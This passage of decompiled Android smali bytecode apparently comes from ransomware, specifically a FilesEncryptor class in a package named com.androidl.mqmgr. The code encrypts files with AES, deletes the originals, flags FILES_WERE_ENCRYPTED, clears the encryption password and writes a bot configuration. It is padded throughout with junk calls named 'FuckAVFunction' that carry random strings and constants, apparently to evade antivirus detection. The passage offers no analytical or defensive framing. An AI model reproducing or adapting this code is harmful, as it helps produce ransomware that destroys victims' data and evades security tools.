    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "Jaaewqk"

    const/4 v6, 0x1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 268
    invoke-direct {p0, v8}, Lcom/androidl/mqmgr/FilesEncryptor;->deleteFile(Ljava/lang/String;)V

    .line 269
    const-string v0, "BRNLgTPFHi"

    const v1, 0x1f4ff740

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "PHDDV"

    const-string v3, "QhChtb"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 270
    const v0, 0x137e983d

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x18474589

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "fApGblfvp"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 271
    const-string v0, "mDsgRH"

    const-string v1, "fjSKtU"

    const v2, 0x32d6ca2d

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    .line 274
    .end local v7    # "aes":Lcom/androidl/mqmgr/AesCrypt;
    .end local v8    # "fileName":Ljava/lang/String;
    :catch_0
    move-exception v0

    .line 275
    :cond_1
    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x9baf32c

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "lOQUnKjt"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const v5, 0x25077c2

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 276
    const v0, 0x2bafd3f0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x2559f222

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x382d7df1

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 277
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "UGEWhA"

    const v3, 0x305163c1

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "NVFFTk"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 278
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "THacq"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "egPsaqD"

    const v5, 0x31139187

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction1(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 280
    :cond_2
    sput-boolean v10, Lcom/androidl/mqmgr/Constants;->FILES_WERE_ENCRYPTED:Z

    .line 281
    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "iwFiDkw"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "HFiRqFFiDu"

    const v5, 0x44c0895

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction1(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 282
    const-string v0, ""

    sput-object v0, Lcom/androidl/mqmgr/Constants;->ENCRYPT_PASSWORD:Ljava/lang/String;

    .line 283
    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "prMffv"

    const v2, 0x310ab893

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction12(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 284
    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "pCQtSC"

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "EdKASMn"

    const v5, 0x2ea7c78d

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction1(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 285
    const-string v0, "SCjdQbbQ"

    const v1, 0x2f4708b9

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "fIjWrdb"

    const-string v3, "FDFPcH"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 286
    invoke-static {}, Lcom/androidl/mqmgr/BotCore;->writePrivateConfig()V

    .line 287
    const v0, 0xe710025

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0xd602033

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "IUhtpCrrU"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 288
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x13498284

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "WtKOOI"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const v5, 0x1eed3f22

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 289
    const-string v0, "suTFBLLm"

    const v1, 0x33c2e0ae

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "wHPTTDR"

    const-string v3, "tEbrQQv"

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v11}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 290
    invoke-static {v10}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "GAMlCKvbA"

    const v2, 0x6e4868a

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction12(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 292
    :cond_3
    return-void
.end method
